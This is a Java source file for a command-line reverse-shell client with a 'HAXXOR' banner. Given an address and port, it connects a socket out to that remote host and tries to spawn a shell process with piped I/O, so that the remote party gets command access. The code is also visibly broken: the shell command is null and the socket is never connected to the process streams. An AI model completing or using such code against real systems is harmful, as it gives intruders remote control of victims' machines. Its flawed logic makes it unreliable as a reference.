package dev.drzymala.reversesheller;

import lombok.NoArgsConstructor;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;

@NoArgsConstructor
public class ClientReverseShell {

    private InetSocketAddress inetServerSocket;

    public ClientReverseShell(String ipAddress, int port) {
        this.inetServerSocket = new InetSocketAddress(ipAddress, port);
    }

    public static void main(String[] args) throws IOException {

        System.out.println();
        System.out.print("8 8888        8          .8.          `8.`8888.      ,8' `8.`8888.      ,8'  ,o888888o.     8 888888888o.\n");
        System.out.print("8 8888        8         .888.          `8.`8888.    ,8'   `8.`8888.    ,8'. 8888     `88.   8 8888    `88.\n");
        System.out.print("8 8888        8        :88888.          `8.`8888.  ,8'     `8.`8888.  ,8',8 8888       `8b  8 8888     `88\n");
        System.out.print("8 8888        8       . `88888.          `8.`8888.,8'       `8.`8888.,8' 88 8888        `8b 8 8888     ,88\n");
        System.out.print("8 8888        8      .8. `88888.          `8.`88888'         `8.`88888'  88 8888         88 8 8888.   ,88'  \n");
        System.out.print("8 8888        8     .8`8. `88888.         .88.`8888.         .88.`8888.  88 8888         88 8 888888888P'   \n");
        System.out.print("8 8888888888888    .8' `8. `88888.       .8'`8.`8888.       .8'`8.`8888. 88 8888        ,8P 8 8888`8b       \n");
        System.out.print("8 8888        8   .8'   `8. `88888.     .8'  `8.`8888.     .8'  `8.`8888.`8 8888       ,8P  8 8888 `8b.     \n");
        System.out.print("8 8888        8  .888888888. `88888.   .8'    `8.`8888.   .8'    `8.`8888.` 8888     ,88'   8 8888   `8b.   \n");
        System.out.print("8 8888        8 .8'       `8. `88888. .8'      `8.`8888. .8'      `8.`8888.  `8888888P'     8 8888     `88.\n");
        System.out.println();
        if (args.length != 2) {
            System.out.print("Usage: java -jar reverse-sheller-0.0.1.jar <addr> <port>\n");
        } else {
            boolean error = false;
            args[0] = args[0].trim();
            if (args[0].length() < 1) {
                error = true;
                System.out.print("<addr> is required\n");
            }
            int port = -1;
            args[1] = args[1].trim();
            if (args[1].length() < 1) {
                error = true;
                System.out.print("<port> is required\n");
            } else {
                try {
                    port = Integer.parseInt(args[1]);
                    if (port < 0 || port > 65535) {
                        error = true;
                        System.out.print("<port> must be between 0 - 65535\n");
                    }
                } catch (NumberFormatException ex) {
                    error = true;
                    System.out.print("\"<port> is not valid\n");
                }
            }
            if (!error) {
                ClientReverseShell shellInstance = new ClientReverseShell(args[0], port);
                shellInstance.connect();
                System.gc();
            }
        }
    }

    private void connect() {

        Process remoteShell;

        try {
            String prompt = null;
            Socket client = new Socket();
            client.connect(inetServerSocket);
            remoteShell = new ProcessBuilder(prompt).redirectInput(ProcessBuilder.Redirect.PIPE)
                    .redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE).start();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
